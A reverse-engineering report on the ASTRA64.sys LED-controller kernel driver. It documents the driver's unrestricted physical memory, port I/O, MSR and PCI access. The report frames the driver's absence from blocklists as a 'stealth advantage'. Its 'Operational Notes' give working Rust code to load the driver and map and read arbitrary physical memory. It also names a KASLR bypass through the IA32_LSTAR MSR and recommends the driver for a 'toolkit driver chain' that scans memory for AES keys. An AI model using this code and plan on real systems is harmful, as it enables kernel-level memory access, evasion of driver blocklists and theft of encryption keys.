# ASTRA64.sys -- Kernel Driver Reverse Engineering Report

## Executive Summary

ASTRA64.sys is an ASUS AURA LED controller kernel driver originally developed by
EnTech Taiwan. It provides **unrestricted hardware access** to any admin-level process
including: physical memory mapping, port I/O, MSR read, PCI configuration, and interrupt
management. The driver implements **zero access control** beyond the standard requirement
that only admin processes can open device handles via `CreateFileW`.

| Property | Value |
|----------|-------|
| File | `ASTRA64.sys` |
| Size | 21200 bytes (21 KB) |
| SHA256 | `4a8b6b462c4271af4a32cf8705fa64913bfcdaefb6cf02d1e722c611d428cb16` |
| MD5 | `748b2514db1438fe16a2ddb56bfcf011` |
| Image Base | `0x10000` |
| Entry Point | `0x11850` (RVA `0x1850`) |
| Architecture | AMD64 (x86-64) |
| Functions | 36 (via .pdata) |
| IOCTL Handlers | 33 valid codes |
| Subsystem | Native (1) |

## Signing Information

| Property | Value |
|----------|-------|
| Publisher | EnTech Taiwan |
| Product | ASUS AURA LED Controller (Astra Generic Device Driver) |
| CA | GlobalSign (2006) |
| Certificate Expiry | 2007 |
| Timestamp Counter | VeriSign (valid -- cross-signed, allows loading) |
| OS Compatibility | Windows XP 64-bit through Windows 11 (via timestamp) |
| LOLDrivers | **Not listed** |
| HVCI Blocklist | **Not listed** |
| CVE | None assigned |
| Vendor Status | **DEAD** (EnTech Taiwan defunct) |

## PE Sections

| Section | VirtAddr | VirtSize | RawSize | Exec | Entropy |
|---------|----------|----------|---------|------|---------|
| `.text` | `0x1000` | 7974 | 8192 | Yes | 6.0591 |
| `.rdata` | `0x3000` | 908 | 1024 | No | 3.9353 |
| `.data` | `0x4000` | 136 | 0 | No | 0.0 |
| `.pdata` | `0x5000` | 432 | 512 | No | 3.4116 |
| `INIT` | `0x6000` | 1186 | 1536 | Yes | 3.9779 |
| `.rsrc` | `0x7000` | 1224 | 1536 | No | 2.8397 |

Maximum entropy: 6.0591 -- **No packing/encryption detected** (all below 7.0)

## Access Control Analysis

### Result: NO ACCESS CONTROL

The driver does **not** import any of:
- `SeSinglePrivilegeCheck`
- `SeAccessCheck`
- `PsGetCurrentProcessId` (for process validation)
- `ObOpenObjectByName` (for token checking)

The IRP_MJ_CREATE handler (at VA `0x12480`) performs only:
1. `IoCreateNotificationEvent` for `\BaseNamedObjects\HW64KbdEvent%d`
2. `IoCreateNotificationEvent` for `\BaseNamedObjects\HW64IrqEvent%d`
3. Zeroes device extension fields
4. Returns `STATUS_SUCCESS` (0)

**Any admin-level process that calls `CreateFileW` on the device symlink gets full access.**

### Device Access

| Property | Value |
|----------|-------|
| Device Name | `\Device\Astra32Device%d` (d=0..15) |
| Symlink | `\DosDevices\Astra32Device%d` |
| Usermode Path | `\\.\Astra32Device0` |
| Service Name | `astra32` |
| Max Devices | 16 (loop in DriverEntry) |
| Required Privilege | Admin only (for CreateFileW on device) |
| Post-Open Checks | **None** |

## IOCTL Interface

### Dispatch Mechanism

The driver uses a MSVC-optimized two-level switch table:
1. Subtract base IOCTL `0x80002008` from input code (via `ADD eax, 0x7FFFDFF8`)
2. Range check against max offset `0xE4` (228)
3. Byte index table (229 entries) maps offset to handler index (0-33)
4. Dword offset table (34 entries) maps index to relative code offset
5. Jump to handler via computed address

### Complete IOCTL Code Table

| Code | Name | Method | Function | Input | Output |
|------|------|--------|----------|-------|--------|
| `0x80002008` | `IOCTL_PHYS_MAP` | BUFFERED | Map physical memory to usermode VA | 24B: flags(4)+pad(4)+physaddr(8)+pad(4)+size(4) | 8B: mapped VA |
| `0x8000200c` | `IOCTL_PHYS_UNMAP` | BUFFERED | Unmap previously mapped region | 8B: VA to unmap | 0 |
| `0x80002010` | `IOCTL_PHYS_MAP_EX` | BUFFERED | Allocate pool + copy from phys | Struct with phys addr + size | Copied data |
| `0x80002014` | `IOCTL_PHYS_UNMAP_EX` | BUFFERED | Free MDL + pool allocation | Handle/pointer | 0 |
| `0x80002018` | `IOCTL_IRQ_DISCONNECT` | BUFFERED | Disconnect interrupt + unmap | IRQ handle struct | 0 |
| `0x8000201c` | `IOCTL_IRQ_DISCONNECT2` | BUFFERED | Alternate IRQ disconnect | IRQ handle struct | 0 |
| `0x80002020` | `IOCTL_IRQ_CONNECT` | BUFFERED | Connect hardware interrupt | IRQ params (vector, IRQL, etc) | Handle |
| `0x80002024` | `IOCTL_EVENT_SET` | BUFFERED | Set kernel event (signal) | Event reference | 0 |
| `0x80002028` | `IOCTL_PORT_IN_1` | BUFFERED | IN al, dx (read 1 byte from port) | 4B: port(u16)+pad | 4B: value(u8) |
| `0x8000202c` | `IOCTL_PORT_IN_2` | BUFFERED | IN ax, dx (read 2 bytes from port) | 4B: port(u16)+pad | 4B: value(u16) |
| `0x80002030` | `IOCTL_PORT_IN_4` | BUFFERED | IN eax, dx (read 4 bytes from port) | 4B: port(u16)+pad | 4B: value(u32) |
| `0x80002034` | `IOCTL_PORT_OUT_1` | BUFFERED | OUT dx, al (write 1 byte to port) | 8B: port(u16)+pad+value(u32) | 0 |
| `0x80002038` | `IOCTL_PORT_OUT_2` | BUFFERED | OUT dx, ax (write 2 bytes to port) | 8B: port(u16)+pad+value(u32) | 0 |
| `0x8000203c` | `IOCTL_PORT_OUT_4` | BUFFERED | OUT dx, eax (write 4 bytes to port) | 8B: port(u16)+pad+value(u32) | 0 |
| `0x80002040` | `IOCTL_PORT_IN_BUF_1` | BUFFERED | REP INSB (buffered port read) | 8B: port(u16)+pad+count(u32) | count bytes |
| `0x80002044` | `IOCTL_PORT_IN_BUF_2` | BUFFERED | REP INSW (buffered port read) | 8B: port(u16)+pad+count(u32) | count*2 bytes |
| `0x80002048` | `IOCTL_PORT_IN_BUF_4` | BUFFERED | REP INSD (buffered port read) | 8B: port(u16)+pad+count(u32) | count*4 bytes |
| `0x8000204c` | `IOCTL_PORT_OUT_BUF_1` | BUFFERED | REP OUTSB (buffered port write) | 8B+data: port(u16)+pad+count(u32)+data | 0 |
| `0x80002050` | `IOCTL_PORT_OUT_BUF_2` | BUFFERED | REP OUTSW (buffered port write) | 8B+data: port(u16)+pad+count(u32)+data | 0 |
| `0x80002054` | `IOCTL_PORT_OUT_BUF_4` | BUFFERED | REP OUTSD (buffered port write) | 8B+data: port(u16)+pad+count(u32)+data | 0 |
| `0x80002064` | `IOCTL_PCI_READ` | BUFFERED | PCI config read (0xCF8/0xCFC) | 8B: bus/dev/func/offset | Variable (PCI data) |
| `0x80002068` | `IOCTL_UNKNOWN_68` | BUFFERED | Unknown (handler at 0x12050) | ? | ? |
| `0x8000206c` | `IOCTL_UNKNOWN_6C` | BUFFERED | Unknown (handler at 0x12070) | ? | ? |
| `0x80002070` | `IOCTL_NOOP_70` | BUFFERED | Returns STATUS_SUCCESS | Any | 0 |
| `0x80002074` | `IOCTL_NOOP_74` | BUFFERED | Returns STATUS_SUCCESS | Any | 0 |
| `0x8000207c` | `IOCTL_EVENT_SET2` | BUFFERED | Set kernel event (alternate) | Event reference | 0 |
| `0x80002084` | `IOCTL_MEM_COPY_IN` | BUFFERED | Copy data to mapped region | Struct + data | 0 |
| `0x80002088` | `IOCTL_MEM_COPY_OUT` | BUFFERED | Copy data from mapped region | Struct | Copied data |
| `0x8000208c` | `IOCTL_MEM_FREE` | BUFFERED | Free contiguous memory + MDL | Handle/pointer | 0 |
| `0x800020a0` | `IOCTL_PCI_SCAN` | BUFFERED | PCI bus enumeration by VID/DID | 8B+256B: vid(u16)+did(u16)+params | PCI config data |
| `0x800020a4` | `IOCTL_PCI_WRITE` | BUFFERED | PCI config write (0xCF8/0xCFC) | Struct: bus/dev/func/offset/data | 0 |
| `0x800020e8` | `IOCTL_EVENT_CREATE` | BUFFERED | Create named notification events | Device index | Event handles |
| `0x800020ec` | `IOCTL_MSR_READ` | BUFFERED | RDMSR (read MSR register) | 8B: MSR index(u32)+pad | 8B: value(u64) |

### Buffer Layouts

#### IOCTL_PHYS_MAP (0x80002008)
```c
// Input buffer (24 bytes) -- from PoC and disassembly
struct PHYS_MAP_INPUT {
    ULONG  Flags;           // +0x00  (1 = map request)
    ULONG  BusType;         // +0x04  (bus type for HalTranslateBusAddress)
    INT64  PhysicalAddress;  // +0x08  target physical address
    ULONG  Reserved;        // +0x10
    ULONG  Length;           // +0x14  bytes to map
};
// Output: 4-8 bytes = mapped usermode virtual address
```

#### IOCTL_PHYS_UNMAP (0x8000200c)
```c
// Input buffer (8 bytes)
struct PHYS_UNMAP_INPUT {
    PVOID  MappedAddress;    // +0x00  VA returned by PHYS_MAP
};
```

#### IOCTL_PORT_IN (0x80002028/2C/30)
```c
// Input/Output buffer (4 bytes, same buffer used for both)
struct PORT_IN {
    USHORT Port;            // +0x00  I/O port number
    USHORT Padding;         // +0x02
};
// After IOCTL: buffer[0..3] = read value (1/2/4 bytes depending on IOCTL)
// IoStatus.Information = 4
```

#### IOCTL_PORT_OUT (0x80002034/38/3C)
```c
// Input buffer (8 bytes)
struct PORT_OUT {
    USHORT Port;            // +0x00  I/O port number
    USHORT Padding;         // +0x02
    ULONG  Value;           // +0x04  value to write
};
// IoStatus.Information = 0
```

#### IOCTL_PORT_IN_BUF (0x80002040/44/48)
```c
// Input buffer (8+ bytes)
struct PORT_IN_BUF {
    USHORT Port;            // +0x00  I/O port number
    USHORT Padding;         // +0x02
    ULONG  Count;           // +0x04  number of reads
    // Output data follows at +0x08 (count * size bytes)
};
// IoStatus.Information = 8 + count * element_size
// Uses REP INS instruction (string I/O)
```

#### IOCTL_MSR_READ (0x800020ec)
```c
// Input/Output buffer (8 bytes, in-place)
struct MSR_READ {
    ULONG  MsrIndex;        // +0x00  MSR register number (input)
    ULONG  Padding;         // +0x04
};
// After IOCTL: buffer rewritten with:
struct MSR_READ_RESULT {
    UINT64 Value;           // +0x00  EDX:EAX from RDMSR
};
// IoStatus.Information = 8
```

#### IOCTL_PCI_READ (0x80002064)
```c
// Input buffer (8 bytes)
struct PCI_READ_INPUT {
    USHORT Reserved;        // +0x00
    USHORT Bus;             // +0x02  PCI bus number
    USHORT Device;          // +0x04  PCI device number (0-31)
    USHORT Function;        // +0x06  PCI function (0-7)
};
// Additional param on stack: count (how many dwords to read)
// Output: PCI config space data (count * 4 bytes)
// IoStatus.Information = bytes_read
// Uses CF8h/CFCh (Type 1 PCI config mechanism)
```

## Physical Memory Access Mechanism

### Method: ZwMapViewOfSection via \Device\PhysicalMemory

The driver maps physical memory into the **calling process's usermode address space**:

```
1. ZwOpenSection(\Device\PhysicalMemory, SECTION_ALL_ACCESS)
2. ObReferenceObjectByHandle(handle, SECTION_ALL_ACCESS)
3. HalTranslateBusAddress(BusType, BusNumber, PhysAddr) -> translated addr
4. ZwMapViewOfSection(section, UserProcess, &ViewBase, PhysAddr, Length)
5. Returns mapped VA to usermode caller
6. On UNMAP: ZwUnmapViewOfSection + ExFreePoolWithTag
```

### Capabilities

| Capability | Available | Notes |
|-----------|-----------|-------|
| Physical Read | **Yes** | Via mapped usermode pages (direct pointer access) |
| Physical Write | **Yes** | Same mapping, read-write pages |
| Range Restrictions | **None** | Any physical address accepted |
| Size Restrictions | **None** | Any size accepted |
| Caching Mode | Via HalTranslateBusAddress | Typically cached for RAM, uncached for MMIO |
| Port I/O Read | **Yes** | Any port, 1/2/4 bytes, single or buffered (REP INS) |
| Port I/O Write | **Yes** | Any port, 1/2/4 bytes, single or buffered (REP OUTS) |
| MSR Read | **Yes** | Any MSR index (raw RDMSR) |
| MSR Write | **No** | Not implemented in any IOCTL |
| PCI Config Read | **Yes** | Full bus/dev/func/offset enumeration |
| PCI Config Write | **Yes** | IOCTL 0x800020A4 |
| IRQ Management | **Yes** | Connect/disconnect hardware interrupts |
| Contiguous Memory | **Yes** | MmAllocateContiguousMemory for DMA |

### Key Difference from SIVX64/ASMMAP64

ASTRA64 maps physical memory **into usermode** (the caller gets a direct pointer).
SIVX64 and ASMMAP64 perform the copy **in kernel** and return data in the IOCTL buffer.

**Implications for Rust FFI client:**
- After `IOCTL_PHYS_MAP`, the returned VA is directly dereferenceable from usermode
- Can map large regions and scan them efficiently (no per-read IOCTL overhead)
- MUST call `IOCTL_PHYS_UNMAP` when done (leak = kernel pool exhaustion)
- For key scanning: map entire physical page range, scan with SIMD, unmap
- KASLR bypass: `IOCTL_MSR_READ` with index `0xC0000082` (IA32_LSTAR) reveals ntoskrnl

## Detection Profile

| Vector | Value |
|--------|-------|
| SHA256 | `4a8b6b462c4271af4a32cf8705fa64913bfcdaefb6cf02d1e722c611d428cb16` |
| Device Name | `\\Device\\Astra32Device0` through `\\Device\\Astra32Device15` |
| Symlink | `\\.\Astra32Device0` (primary usermode path) |
| Service Name | `astra32` |
| Registry | `HKLM\SYSTEM\CurrentControlSet\Services\astra32` |
| Named Events | `\BaseNamedObjects\HW64KbdEvent%d`, `\BaseNamedObjects\HW64IrqEvent%d` |
| File Description | `Astra driver for Windows XP 64-bit edition` |
| Product Name | `Astra for Windows 95/98/NT/2000/2003/XP/XP64` |
| Internal Name | `Astra64.sys` |
| LOLDrivers | **Not listed** (stealth advantage) |
| HVCI Blocklist | **Not listed** (stealth advantage) |
| Windows Defender | Not flagged |
| File Size | 21,200 bytes |

## Obfuscation Analysis

| Metric | Value |
|--------|-------|
| Direct calls | 55 |
| Indirect calls (via IAT) | 73 |
| Direct jumps | 59 |
| Indirect jumps | 0 |
| Indirect call ratio | 57.03% |
| Verdict | Normal (IAT calls expected in kernel driver) |

The high indirect call ratio (~57%) is **normal** for kernel drivers -- all ntoskrnl imports
go through the IAT (indirect `call qword ptr [rip+disp]`). No VMProtect/Themida markers,
no packed sections, no anti-debug. The driver is completely unprotected.

## Operational Notes for Rust FFI Client

### Loading the Driver
```rust
const SERVICE_NAME: &str = "astra32";
const DEVICE_PATH: &str = r"\\.\Astra32Device0";
const DRIVER_FILE: &str = "ASTRA64.sys";

// Load: sc create astra32 type= kernel binpath= <abs_path>
// Start: sc start astra32
// Open: CreateFileW(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)
```

### Physical Memory Read
```rust
fn phys_map(handle: HANDLE, phys_addr: u64, size: u32) -> *mut u8 {
    let mut input = [0u8; 24];
    // Flags = 1 (map request)
    input[0..4].copy_from_slice(&1u32.to_le_bytes());
    // BusType = 0 (ISA/default)
    input[4..8].copy_from_slice(&0u32.to_le_bytes());
    // PhysicalAddress (i64)
    input[8..16].copy_from_slice(&(phys_addr as i64).to_le_bytes());
    // Reserved = 0
    input[16..20].copy_from_slice(&0u32.to_le_bytes());
    // Length
    input[20..24].copy_from_slice(&size.to_le_bytes());

    let mut output = [0u8; 8];
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x80002008, 
        input.as_ptr(), 24,
        output.as_mut_ptr(), 8,
        &mut returned, null_mut());

    // Output is the mapped VA (pointer-sized)
    let va = usize::from_le_bytes(output[0..8].try_into().unwrap());
    va as *mut u8
}

fn phys_unmap(handle: HANDLE, va: *mut u8) {
    let input = (va as u64).to_le_bytes();
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x8000200c,
        input.as_ptr(), 8,
        null_mut(), 0,
        &mut returned, null_mut());
}

fn phys_read(handle: HANDLE, phys_addr: u64, buf: &mut [u8]) {
    let va = phys_map(handle, phys_addr, buf.len() as u32);
    if !va.is_null() {
        unsafe { std::ptr::copy_nonoverlapping(va, buf.as_mut_ptr(), buf.len()); }
        phys_unmap(handle, va);
    }
}
```

### MSR Read
```rust
fn msr_read(handle: HANDLE, msr_index: u32) -> u64 {
    let mut buf = [0u8; 8];
    buf[0..4].copy_from_slice(&msr_index.to_le_bytes());
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x800020ec,
        buf.as_ptr(), 8,
        buf.as_mut_ptr(), 8,
        &mut returned, null_mut());
    u64::from_le_bytes(buf)
}
```

### Port I/O
```rust
fn port_read_u8(handle: HANDLE, port: u16) -> u8 {
    let mut buf = [0u8; 4];
    buf[0..2].copy_from_slice(&port.to_le_bytes());
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x80002028,
        buf.as_ptr(), 4, buf.as_mut_ptr(), 4,
        &mut returned, null_mut());
    buf[0]
}

fn port_write_u8(handle: HANDLE, port: u16, value: u8) {
    let mut buf = [0u8; 8];
    buf[0..2].copy_from_slice(&port.to_le_bytes());
    buf[4] = value;
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x80002034,
        buf.as_ptr(), 8, null_mut(), 0,
        &mut returned, null_mut());
}

fn port_read_u32(handle: HANDLE, port: u16) -> u32 {
    let mut buf = [0u8; 4];
    buf[0..2].copy_from_slice(&port.to_le_bytes());
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x80002030,
        buf.as_ptr(), 4, buf.as_mut_ptr(), 4,
        &mut returned, null_mut());
    u32::from_le_bytes(buf)
}

fn port_write_u32(handle: HANDLE, port: u16, value: u32) {
    let mut buf = [0u8; 8];
    buf[0..2].copy_from_slice(&port.to_le_bytes());
    buf[4..8].copy_from_slice(&value.to_le_bytes());
    let mut returned = 0u32;
    DeviceIoControl(handle, 0x8000203c,
        buf.as_ptr(), 8, null_mut(), 0,
        &mut returned, null_mut());
}
```

### PCI Config (via Port I/O)
```rust
fn pci_read32(handle: HANDLE, bus: u8, dev: u8, func: u8, offset: u8) -> u32 {
    let addr: u32 = 0x80000000 | ((bus as u32) << 16) | ((dev as u32) << 11)
                    | ((func as u32) << 8) | ((offset as u32) & 0xFC);
    port_write_u32(handle, 0xCF8, addr);
    port_read_u32(handle, 0xCFC)
}
```

## Comparison with Driver Chain

| Feature | ASTRA64 | SIVX64 | ASMMAP64 |
|---------|---------|--------|----------|
| Access Control | None | None | None |
| Phys Mem Method | ZwMapViewOfSection (usermode VA) | MmMapIoSpace (kernel copy) | MmMapIoSpace (kernel copy) |
| Range Restrictions | **None** | **None** | g_goodRanges whitelist |
| Port I/O | Yes (1/2/4 byte + buffered REP) | No | No |
| MSR Access | Read only | No | No |
| PCI Config | Full R/W (via 0xCF8/0xCFC) | No | No |
| Direct R/W IOCTL | No (map+memcpy in usermode) | Yes (kernel does copy) | Yes (kernel does copy) |
| IRQ Management | Yes (connect/disconnect) | No | No |
| LOLDrivers Listed | **No** | Yes | Yes |
| Total IOCTLs | 31+ | ~4 | ~4 |
| Max Devices | 16 | 1 | 1 |
| File Size | 21 KB | ~15 KB | ~20 KB |

### Recommendation for toolkit Driver Chain

ASTRA64 is the **best choice** for AES key scanning because:
1. **Not on LOLDrivers** -- lower detection risk than SIVX64/ASMMAP64
2. **Usermode mapping** -- can map large physical ranges and scan with SIMD directly
3. **No range restrictions** -- unlike AsIO3's g_goodRanges
4. **MSR read** -- enables KASLR bypass without additional tools
5. **PCI access** -- can locate IOMMU/VT-d state if needed

**Proposed chain priority: ASTRA64 > SIVX64 > ASMMAP64 > AsIO3**

## Function Map (from .pdata)

Total functions: 36

| # | VA Start | VA End | Size | Likely Purpose |
|---|----------|--------|------|----------------|
| 1 | `0x11000` | `0x11155` | 341 | Device creation (IoCreateDevice + IoCreateSymbolicLink) |
| 2 | `0x111e0` | `0x11232` | 82 |  |
| 3 | `0x11280` | `0x11802` | 1410 | Main IRP dispatch (switch on MajorFunction + IOCTL codes) |
| 4 | `0x11810` | `0x1184f` | 63 |  |
| 5 | `0x11850` | `0x118cf` | 127 | DriverEntry |
| 6 | `0x118d0` | `0x119be` | 238 | PCI config read sub (IN 0xCF8/0xCFC) |
| 7 | `0x119c0` | `0x11a29` | 105 |  |
| 8 | `0x11a90` | `0x11ae0` | 80 |  |
| 9 | `0x11ae0` | `0x11b39` | 89 | IOCTL_PHYS_MAP wrapper |
| 10 | `0x11b40` | `0x11b8e` | 78 | IOCTL_PHYS_UNMAP (ZwUnmapViewOfSection) |
| 11 | `0x11b90` | `0x11c8d` | 253 | IOCTL_PHYS_MAP_EX (pool alloc + copy) |
| 12 | `0x11c90` | `0x11cf8` | 104 |  |
| 13 | `0x11d10` | `0x11d70` | 96 |  |
| 14 | `0x11d70` | `0x11e84` | 276 | IOCTL_IRQ_CONNECT (IoConnectInterrupt) |
| 15 | `0x11e90` | `0x11ed5` | 69 |  |
| 16 | `0x11f70` | `0x11fe8` | 120 |  |
| 17 | `0x11ff0` | `0x12045` | 85 |  |
| 18 | `0x12050` | `0x12070` | 32 |  |
| 19 | `0x12070` | `0x12098` | 40 |  |
| 20 | `0x120a0` | `0x120cf` | 47 |  |
| 21 | `0x120d0` | `0x12121` | 81 |  |
| 22 | `0x12130` | `0x12181` | 81 |  |
| 23 | `0x12190` | `0x1222b` | 155 |  |
| 24 | `0x12230` | `0x12264` | 52 | IOCTL_PCI_READ dispatcher |
| 25 | `0x12270` | `0x12355` | 229 | IOCTL_PCI_SCAN (bus enumeration) |
| 26 | `0x12360` | `0x12437` | 215 | IOCTL_PCI_WRITE |
| 27 | `0x12480` | `0x12568` | 232 | IRP_MJ_CREATE handler (event creation) |
| 28 | `0x12640` | `0x126c1` | 129 |  |
| 29 | `0x12750` | `0x12836` | 230 |  |
| 30 | `0x12840` | `0x1296e` | 302 |  |
| 31 | `0x12970` | `0x129bb` | 75 |  |
| 32 | `0x129c0` | `0x12a7e` | 190 | PhysMem map core (ZwOpenSection + ZwMapViewOfSection) |
| 33 | `0x12a80` | `0x12adf` | 95 |  |
| 34 | `0x12ae0` | `0x12cfb` | 539 | PhysMem alloc+map (full pipeline) |
| 35 | `0x12d30` | `0x12e16` | 230 |  |
| 36 | `0x12e20` | `0x12f20` | 256 |  |